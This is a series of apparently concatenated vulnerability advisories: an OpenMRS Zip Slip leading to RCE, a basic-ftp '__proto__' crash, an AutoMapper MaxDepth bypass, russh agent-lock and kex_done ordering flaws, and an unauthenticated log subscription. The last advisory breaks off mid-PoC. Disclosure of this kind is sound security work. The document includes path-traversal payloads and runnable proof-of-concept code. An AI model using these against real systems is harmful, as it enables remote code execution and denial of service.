## Affected Versions

version ≤ 2.7.8 (latest version at time of disclosure)

https://github.com/openmrs/openmrs-core

## Impact

The endpoint `POST /openmrs/ws/rest/v1/module` is vulnerable to a path traversal (Zip Slip) attack. An authenticated attacker can upload a crafted `.omod` archive containing ZIP entries with directory traversal sequences. Upon automatic extraction by the server, the incomplete path validation in `WebModuleUtil.startModule()` fails to prevent entries such as `web/module/../../../../malicious.jsp` from being written outside the intended module directory. If the traversal target falls within the web application root (e.g., `/usr/local/tomcat/webapps/openmrs/`), the attacker achieves arbitrary file write and subsequent Remote Code Execution.

Notably, other extraction methods in the same codebase (`ModuleUtil.expandJar()`, `TestInstallUtil.addZippedTestModules()`) are properly protected with `normalize().startsWith()` checks — this vulnerability is an oversight where the same fix was not applied.

Furthermore, the `module.allow_web_admin` runtime property, which is intended to restrict administrators from managing modules via the web interface, only gates the Legacy UI controller entry point. The REST API endpoint `POST /openmrs/ws/rest/v1/module` does not check this property, allowing this restriction to be fully bypassed.

## Steps to Reproduce

1. Construct a malicious `.omod` file (which is a ZIP/JAR archive) containing a ZIP entry with a path traversal payload in its entry name, such as `web/module/../../../../<target_filename>`. Upload this file to `POST /openmrs/ws/rest/v1/module` with valid admin credentials via Basic Auth.

<img width="1986" height="1102" alt="image" src="https://github.com/user-attachments/assets/647f15de-7e8c-40b9-aba9-d4db5d2e0b52" />

<img width="2048" height="1078" alt="image" src="https://github.com/user-attachments/assets/301412a0-e3b0-4afb-91c2-e9739de3080d" />


2. The server parses and loads the module. During `WebModuleUtil.startModule()`, entries under `web/module/` are automatically extracted. The existing check `Paths.get(name).startsWith("..")` only blocks entries beginning with `..`, so an entry starting with `web/module/` passes the check. The `../` sequences in the remaining path cause the file to be written outside the intended `WEB-INF/view/module/` directory — for example, into the web application root at `/usr/local/tomcat/webapps/openmrs/`.

<img width="1439" height="141" alt="image" src="https://github.com/user-attachments/assets/4bda3b1e-a80e-42ed-af2b-a1da53e8db03" />

3. The traversed file is now accessible under the web application root. If the written file is a JSP script, accessing it via the browser triggers server-side execution, achieving RCE.

<img width="1482" height="300" alt="image" src="https://github.com/user-attachments/assets/61936002-78cd-4203-80f0-f0a8702b216c" />

## Root Cause Analysis

The vulnerability exists in `WebModuleUtil.startModule()` (`web/src/main/java/org/openmrs/module/web/WebModuleUtil.java`).

### Vulnerable code:

```java
Enumeration<JarEntry> entries = jarFile.entries();
while (entries.hasMoreElements()) {
    JarEntry entry = entries.nextElement();
    String name = entry.getName();

    // ❌ Incomplete check — only blocks entries starting with ".."
    if (Paths.get(name).startsWith("..")) {
        throw new UnsupportedOperationException("...");
    }

    if (name.startsWith("web/module/")) {
        String filepath = name.substring(11);
        StringBuilder absPath = new StringBuilder(realPath + "/WEB-INF");
        absPath.append("/view/module/");
        absPath.append(mod.getModuleIdAsPath()).append("/").append(filepath);

        // ❌ No normalize() or startsWith() boundary check before writing
        File outFile = new File(absPath.toString().replace("/", File.separator));
        outStream = new FileOutputStream(outFile, false);
        inStream = jarFile.getInputStream(entry);
        OpenmrsUtil.copyFile(inStream, outStream);
    }
}
```

**Why the check fails:** For an entry named `web/module/foo/../../../../evil.jsp`, `Paths.get(name)` starts with `web`, not `..`, so the check passes. After `name.substring(11)`, the filepath `foo/../../../../evil.jsp` is concatenated directly into the output path without normalization, resulting in a write outside the intended directory.

### Correctly protected code in the same codebase:

**`ModuleUtil.expandJar()`:**

```java
// ✅ Correct — uses normalize().startsWith()
if (!parent.toPath().normalize().startsWith(docBase)) {
    throw new UnsupportedOperationException("...");
}
```

**`TestInstallUtil.addZippedTestModules()`:**

```java
// ✅ Correct — uses normalize().startsWith()
if (!zipEntryFile.toPath().normalize().startsWith(moduleRepository.toPath().normalize())) {
    throw new IOException("Bad zip entry");
}
```

The fix pattern is already known and applied elsewhere in the codebase. `WebModuleUtil.startModule()` is an oversight.

### Bypass of `module.allow_web_admin`

The `module.allow_web_admin` property only restricts module operations at the Legacy UI layer (`ModuleListController`). The REST API endpoint does not consult this property:

```
Legacy UI:  POST /admin/modules/moduleList.form → allowAdmin() check → [BLOCKED]
REST API:   POST /ws/rest/v1/module             → No allowAdmin() check → [ALLOWED]
                ↓
        ModuleFactory.loadModule()
                ↓
        WebModuleUtil.startModule()   ← Zip Slip here, no allowAdmin check
                ↓
        FileOutputStream.write()      ← Arbitrary file write
```

## Remediation

Add `normalize().startsWith()` boundary validation before writing, consistent with the existing pattern in `ModuleUtil.expandJar()`:

```java
File outFile = new File(absPath.toString().replace("/", File.separator));

// ✅ Add this check
if (!outFile.toPath().normalize().startsWith(
        Paths.get(realPath, "WEB-INF").normalize())) {
    throw new UnsupportedOperationException(
        "Zip entry '" + name + "' would be written outside the allowed directory.");
}
```

Additionally, enforce the `module.allow_web_admin` restriction consistently across all module upload entry points, including the REST API.

### Summary

basic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name "__proto__" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the "not a function" guard is bypassed and the code throws `TypeError: factHandler is not a function`.

This TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).

### Details

File: src/parseListMLSD.ts
```
const factHandlersByName: {[key: string]: FactHandler} = {
    "size": parseSize,
    "sizd": parseSize,
    "unique": (value, info) => { info.uniqueID = value },
    "modify": (value, info) => { ... },
    "type": (value, info) => { ... },
    "unix.mode": (value, info) => { ... },
    ...
}

export function parseLine(line: string): FileInfo | undefined {
    const [ packedFacts, name ] = splitStringOnce(line, " ")
    ...
    const facts = packedFacts.split(";")
    for (const fact of facts) {
        const [ factName, factValue ] = splitStringOnce(fact, "=")
        if (!factValue) { continue }
        const factHandler = factHandlersByName[factName.toLowerCase()]   // <-- unsafe lookup
        if (!factHandler) { continue }
        const result = factHandler(factValue, info)                     // <-- throws here
        ...
    }
    return info
}
```
factHandlersByName is a plain `{}` object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === "__proto__", the bracket lookup factHandlersByName["__proto__"] returns Object.prototype itself — a truthy, non-undefined value — so the `if (!factHandler) continue` guard does not fire. The code then tries to call Object.prototype as a function: `factHandler(factValue, info)`, which throws `TypeError: factHandler is not a function`.

This line runs inside parseList() (src/parseList.ts), called synchronously from a `.map()` over every line of the listing, which in turn is called from Client._requestListWithCommand() -> Client.list() (src/Client.ts). list()'s only error handling is:
```
    catch (err) {
        const shouldTryNext = err instanceof FTPError
        if (!shouldTryNext) { throw err }
        lastError = err
    }
```
A plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.

Affected call paths (all eventually call Client.list()):
- Client.list()
- Client.downloadToDir() / _downloadFromWorkingDir()
- Client.clearWorkingDir()
- Client.removeDir()

Only "__proto__" triggers the crash this way; other reserved Object.prototype property names tested ("constructor", "toString", "hasOwnProperty", "valueOf", "__defineGetter__") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.

### Proof of concept

Prerequisites: Node.js, a clone/checkout of basic-ftp, `npm install` then `npm run buildOnly` (or `npx tsc`) to produce dist/.

Step 1 — Minimal reproduction of the parser bug alone:

    node -e '
    const { parseList } = require("./dist/parseList");
    parseList("__proto__=x;type=file;size=10; evil.txt");
    '

Expected result:
    Uncaught TypeError: factHandler is not a function
        at parseLine (.../dist/parseListMLSD.js:...)

Step 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:

    Save as poc.js in the repo root and run `node poc.js`:

    const net = require("net")
    const { Client } = require("./dist/index")

    const server = net.createServer(socket => {
        socket.write("220 fake ftp ready\r\n")
        socket.on("data", data => {
            const cmd = data.toString().trim()
            if (cmd.startsWith("USER")) socket.write("230 ok\r\n")
            else if (cmd.startsWith("OPTS") || cmd.startsWith("TYPE") ||
                     cmd.startsWith("STRU") || cmd.startsWith("PBSZ") ||
                     cmd.startsWith("PROT")) socket.write("200 ok\r\n")
            else if (cmd.startsWith("FEAT")) socket.write("211-Features\r\n MLST type;size;\r\n211 End\r\n")
            else if (cmd.startsWith("EPSV")) {
                const dataServer = net.createServer(dsock => {
                    // The malicious line: fact name "__proto__"
                    dsock.end("__proto__=pwn;type=file;size=4; evil.txt\r\n")
                })
                dataServer.listen(0, "127.0.0.1", () => {
                    const p = dataServer.address().port
                    socket.write(`229 Entering Extended Passive Mode (|||${p}|)\r\n`)
                })
            }
            else if (cmd.startsWith("MLSD") || cmd.startsWith("LIST")) {
                socket.write("150 Here comes the listing\r\n")
                setTimeout(() => socket.write("226 Listing complete\r\n"), 50)
            }
            else socket.write("200 ok\r\n")
        })
    })

    server.listen(2121, "127.0.0.1", async () => {
        const client = new Client()
        try {
            await client.access({ host: "127.0.0.1", port: 2121, user: "a", password: "b" })
            const files = await client.list()
            console.log("list() returned normally (unexpected):", files)
        } catch (err) {
            console.log("client.list() threw:", err.constructor.name, "-", err.message)
        } finally {
            client.close()
            server.close()
            process.exit(0)
        }
    })

Expected output:

    client.list() threw: TypeError - factHandler is not a function

Configuration notes:
- No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV
  text) session using the server's FEAT response to turn on MLSD, which is the common
  path for any modern FTP server.
- The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since
  parseList() auto-detects the format from the last listing line.
- In a real application without a try/catch around list()/downloadToDir()/
  clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the
  Node.js process by default (Node >=15 unhandledRejection behavior is "throw").

### Impact

Type: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).

Who is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.

Confidentiality: None. Integrity: None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation.

### Summary
`MaxDepth`, whether set explicitly or applied by default (64) to self-referential type maps, was not enforced when the recursion goes through constructor parameters. Mapping a deeply nested source to a destination built through its constructor, such as a positional `record`, recurses without bound and throws a `StackOverflowException`. That exception can't be caught and terminates the process. This bypasses the mitigation for CVE-2026-32933.

### Details
The type depth used by `MaxDepth` was incremented only after the destination object was created. Constructor parameters, including child objects of the same type, are mapped while the destination is created, so each level recursed before its parent was counted, and the depth check never tripped.

Affected:
- destination types mapped through constructor parameters, including positional records
- both an explicit `MaxDepth(n)` and the default limit of 64
- `ConstructUsing` that maps recursively through `context.Mapper`

With `MaxDepth(10)`, a 100-level chain was mapped to all 100 levels. On a 1 MB stack (the Windows default), the process crashed at between 1,000 and 2,000 levels.

### PoC
The type only has a constructor with positional arguments, and `MaxDepth` is set to 10:

```csharp
using AutoMapper;


// Setup configuration - with MaxDepth set
var mapper = new MapperConfiguration(cfg =>
    {
        cfg.CreateMap<CircularClass, CircularClass>().MaxDepth(10);
    })
    .CreateMapper();

// Create a deeply nested object (28,000+ levels)
var root = new CircularClass(null);
var current = root;
for (int i = 0; i < 30000; i++)
{
    current.Next = new CircularClass(null);
    current = current.Next;
}

// STACK OVERFLOW even though the max depth is set
var mappedRoot = mapper.Map<CircularClass>(root);


public class CircularClass
{
    public CircularClass(CircularClass? Next)
    {
        this.Next = Next;
    }

    public CircularClass? Next { get; set; }
}
```

### Impact
Any application that maps attacker-influenced, deeply nested data to a destination type built through a constructor, with a recursive member, can be crashed. Setting `MaxDepth` as recommended for CVE-2026-32933 doesn't protect these mappings.

### Patches
Fixed in 16.3.0 and 15.1.4. The depth is now counted before the destination is created, so constructor mapping stops at the same depth as property mapping.

### Workarounds
If the destination type has a parameterless constructor and settable properties, `cfg.DisableConstructorMapping()` makes AutoMapper map through the properties, where `MaxDepth` is enforced. Positional records have no workaround other than limiting input depth before mapping, or upgrading.

### Credits
Reported by @mcambria, who found it while writing a test to confirm their `MaxDepth` mitigation for CVE-2026-32933.

### Related
- CVE-2026-32933 (GHSA-rvv3-g6hj-g44x)
- GHSA-gpwp-5797-mjff: other paths that bypassed `MaxDepth` (polymorphic maps, runtime-typed members, dictionary and dynamic sources, recursive type converters), fixed in the same releases.

### Summary

In russh `0.65.0`, a sign request for a confirmation-constrained key can retain
and use the private key after another connection locks the agent. `try_sign()`
snapshots an `Arc<PrivateKey>` before awaiting `Agent::confirm()` and does not
revalidate the shared lock state after the await. An agent-forwarding peer can
therefore obtain a signature while the agent is locked and every new request is
being rejected.

### Details

The agent's lock and key stores are shared by all connections. `respond()` reads
the lock state once, then dispatches a sign request:

```rust
let is_locked = {
    // ... read the shared lock ...
};

// ...
Some((&13, mut r))
    if !is_locked && agentref.confirm_request(MessageType::Sign).await =>
{
    let agent = self.agent.take().ok_or(Error::AgentFailure)?;
    let (agent, signed) = self.try_sign(agent, &mut r, writebuf).await?;
```

In `try_sign()`, russh clones the private key from the shared store and drops the
store lock before awaiting the asynchronous confirmation callback:

```rust
let key = {
    let blob = Bytes::decode(r)?;
    let k = self.keys.0.read().or(Err(Error::AgentFailure))?;
    if let Some((key, _, constraints)) = k.get(&blob.to_vec()) {
        if constraints.contains(&Constraint::Confirm) {
            needs_confirm = true;
        }
        key.clone()
    } else {
        return Ok((agent, false));
    }
};

let agent = if needs_confirm {
    let (agent, ok) = agent.confirm(key.clone()).await;
    if !ok {
        return Ok((agent, false));
    }
    agent
} else {
    agent
};

// No lock/key-state revalidation occurs here.
sign_with_hash_alg(&PrivateKeyWithHashAlg::new(key, hash_alg), &data)?
    .encode(writebuf)?;
```

While `confirm()` is pending, a second agent connection can successfully lock
the shared agent. When confirmation later returns `true`, the original
connection signs with its captured `Arc<PrivateKey>`.

The affected code is in
[`russh/src/keys/agent/server.rs`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L128-L162)
and
[`try_sign()`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L330-L375).

RFC 9987 section 5.7 requires a locked agent to suspend private-key signature
operations until it is unlocked. A fresh request is correctly rejected while
locked; only the request suspended across the await bypasses the lock.

The vulnerable asynchronous call was introduced by commit `62db6e7` as the fix
for GHSA-vp5q-ff62-jwqv. The behavior is present in released version `0.65.0`
and current commit `183a22e8f8f490fa09b6eb7bd044ef99d8c4414f`.

### Expected behavior

After the agent reports a successful lock, no private-key signature operation
should complete until a successful unlock.

### Actual behavior

A request that reached `Agent::confirm()` before the state transition signs
afterward. New requests made in the same locked or expired state fail, confirming
that the shared state transition took effect.

### Proof of concept

The PoC is self-contained and uses in-memory duplex streams; it does not require
an SSH server, Unix socket, or attached binary file. With a current stable Rust
toolchain installed, create a new directory:

```sh
mkdir -p russh-agent-lock-toctou-poc/src
cd russh-agent-lock-toctou-poc
```

Create `Cargo.toml`:

```toml
[package]
name = "russh-agent-lock-toctou-poc"
version = "0.1.0"
edition = "2024"

[dependencies]
futures = "0.3"
rand = { version = "0.10", features = ["thread_rng"] }
russh = "=0.65.0"
tokio = { version = "1", features = ["macros", "rt-multi-thread", "sync"] }
tokio-stream = "0.1"
```

Create `src/main.rs`:

```rust
use std::{future::Future, sync::Arc};

use russh::keys::agent::{
    Constraint,
    client::AgentClient,
    server::{self, Agent},
};
use russh::keys::{Algorithm, PrivateKey};
use tokio::{
    io::DuplexStream,
    sync::{Notify, mpsc},
};
use tokio_stream::wrappers::ReceiverStream;

#[derive(Clone)]
struct DelayedConfirm {
    entered: Arc<Notify>,
    release: Arc<Notify>,
}

impl Agent for DelayedConfirm {
    fn confirm(
        self,
        _key: Arc<PrivateKey>,
    ) -> Box<dyn Future<Output = (Self, bool)> + Unpin + Send> {
        Box::new(Box::pin(async move {
            self.entered.notify_one();
            self.release.notified().await;
            (self, true)
        }))
    }
}

async fn connect(
    sender: &mpsc::Sender<std::io::Result<DuplexStream>>,
) -> AgentClient<DuplexStream> {
    let (server_stream, client_stream) = tokio::io::duplex(1024 * 1024);
    sender.send(Ok(server_stream)).await.unwrap();
    AgentClient::connect(client_stream)
}

#[tokio::main]
async fn main() {
    let entered = Arc::new(Notify::new());
    let release = Arc::new(Notify::new());
    let agent = DelayedConfirm {
        entered: entered.clone(),
        release: release.clone(),
    };

    let (sender, receiver) = mpsc::channel(4);
    tokio::spawn(async move {
        server::serve::<DuplexStream, _, _>(ReceiverStream::new(receiver), agent)
            .await
            .unwrap();
    });

    let key = PrivateKey::random(&mut rand::rng(), Algorithm::Ed25519).unwrap();
    let public_key = key.public_key().clone();

    let mut administrator = connect(&sender).await;
    administrator
        .add_identity(&key, &[Constraint::Confirm])
        .await
        .unwrap();

    let mut attacker = connect(&sender).await;
    let attacker_key = public_key.clone();
    let pending_sign = tokio::spawn(async move {
        attacker
            .sign_request_signature(&attacker_key, None, b"attacker-controlled request")
            .await
    });

    entered.notified().await;
    administrator.lock(b"lock-password").await.unwrap();
    println!("agent locked while confirmation was pending");

    // Control: a request started after the lock is rejected.
    let mut control = connect(&sender).await;
    let control_result = control
        .sign_request_signature(&public_key, None, b"post-lock request")
        .await;
    println!("new post-lock request accepted: {}", control_result.is_ok());

    // The original request signs after the lock has taken effect.
    release.notify_one();
    let pending_result = pending_sign.await.unwrap();
    println!(
        "pre-lock request signed after lock: {}",
        pending_result.is_ok()
    );

    assert!(control_result.is_err());
    assert!(pending_result.is_ok());
}
```

Run:

```sh
cargo run --quiet
```

Observed on russh `0.65.0` with Rust `1.91.0`:

```text
agent locked while confirmation was pending
new post-lock request accepted: false
pre-lock request signed after lock: true
```

### Impact

russh-based SSH agents that implement asynchronous confirmation are affected,
including agents exposed to remote SSH servers through agent forwarding. A peer
can begin a signature request while the agent is unlocked and hold it in the
confirmation phase. If the agent is subsequently locked, approving or otherwise
completing the stale confirmation still gives the peer a signature that the
agent's current state rejects for every new request.

This weakens emergency locking. The attacker does not recover private key
material, and exploitation requires a sign request to be pending across the
state transition and its confirmation callback eventually to return `true`.

## Related

- [RFC 9987 section 5.7: Locking and Unlocking an Agent](https://www.rfc-editor.org/rfc/rfc9987.html#section-5.7)
- [GHSA-vp5q-ff62-jwqv / CVE-2026-116794: missing confirmation enforcement](https://github.com/advisories/GHSA-vp5q-ff62-jwqv)
- [Commit `62db6e7`: call `Agent::confirm`](https://github.com/Eugeny/russh/commit/62db6e7defd6d244159da962ccccb029e785ce0f)
- [Affected `respond()` implementation at `v0.65.0`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L128-L162)
- [Affected `try_sign()` implementation at `v0.65.0`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L330-L375)

### Summary

An unauthenticated WebSocket client can subscribe to the log path and receive buffered server logs.

WebSocket connections are intentionally permitted before authentication because login occurs over the WebSocket connection. However, the log subscription path does not enforce an authorization check.

`processSubscribe` handles subscriptions to the log path separately, without applying access control:

```ts
if (
  Array.isArray(msg.subscribe) &&
  msg.subscribe.length > 0 &&
  msg.subscribe[0].path === 'log'
) {
  if (!spark.logUnsubscribe) {
    spark.logUnsubscribe = startServerLog(app, spark)
  }
} else {
  // normal subscriptions go through subscriptionmanager, which applies
  // securityStrategy.filterReadDelta
}
```

`startServerLog` then replays the whole buffer to that socket:

```ts
app.logging.getLog().forEach((log) => {
  spark.write({ type: 'LOG', data: log })
})
```

The asymmetry is inside this one file. Writes are gated by `securityStrategy.shouldAllowWrite` (`ws.ts:961`), normal delta subscriptions are filtered by `securityStrategy.filterReadDelta` (`ws.ts:1159`, the else branch of this same function), and the log branch consults neither.

An unauthenticated socket, which is legitimately open for login, can subscribe to `log` and receive buffered server logs.

Fix: Requires an administrator principal, before `startServerLog`, in the same way the other branch defers to `securityStrategy`. The fix was released with version 2.31.0-beta.1.

The investigated code path was reviewed at commit 26ab199. No server was run and no WebSocket frames were captured. AI assistance was used during the investigation.

### Summary

A malicious SSH server whose host key is rejected can still cause russh's `client::Handler::kex_done()` callback to execute with the raw key-exchange shared secret. Applications using the callback for its documented protocol-bridging purpose may derive keys, initialize a secondary data channel, or perform another externally visible action before russh calls `check_server_key()` and rejects the server.

### Details

During the initial key exchange, russh calls `kex_done()` immediately after the server proves possession of the presented host key, but before the application decides whether that key belongs to the intended server:

```rust
let shared_secret = newkeys.kex.shared_secret_bytes();
handler
    .kex_done(shared_secret, &newkeys.names, session)
    .await?;

// Initial KEX only checks trust afterwards.
if let Some(certificate) = server_host_certificate {
    if !handler.check_server_key(&certificate.into()).await? {
        return Err(crate::Error::UnknownKey.into());
    }
} else if let Some(server_host_key) = server_host_key {
    let check = handler.check_server_key(&server_host_key.into()).await?;
    if !check {
        return Err(crate::Error::UnknownKey.into());
    }
}
```

This is in `russh/src/client/mod.rs` at lines 2036-2078 of commit `183a22e8f8f490fa09b6eb7bd044ef99d8c4414f`.

The API documentation describes `check_server_key()` as the important trust decision that prevents man-in-the-middle attacks. It describes `kex_done()` as the callback for deriving keys for secondary encrypted channels. The feature request that introduced the callback specifically lists VPN-over-SSH, UDP data planes, file transfer, and custom enterprise transports as intended uses.

Cryptographic verification of the KEX signature does not establish peer identity: an attacker operating its own SSH server can always produce a valid signature with its own host key. Identity is established only when `check_server_key()` accepts that key or certificate.

### Expected behavior

For the initial key exchange, `check_server_key()` should accept the server identity before `kex_done()` exposes the shared secret for secondary-channel initialization.

### Actual behavior

`kex_done()` runs first. An untrusted server can therefore trigger application-defined secondary-channel actions even though `check_server_key()` subsequently rejects it with `UnknownKey`.

The callback was introduced by commit `500bef1eccc1c48ac674e2a262aa7887777431eb` and is present from `v0.55.0` through current `v0.65.0`.

### Proof of concept

The following self-contained Cargo project starts a local russh server with a fresh, untrusted host key. The client models the documented bridge use case by exporting the shared secret in `kex_done()`, while `check_server_key()` rejects the server. It asserts both the failed connection and the callback order.

Create an empty directory and add `Cargo.toml`:

```toml
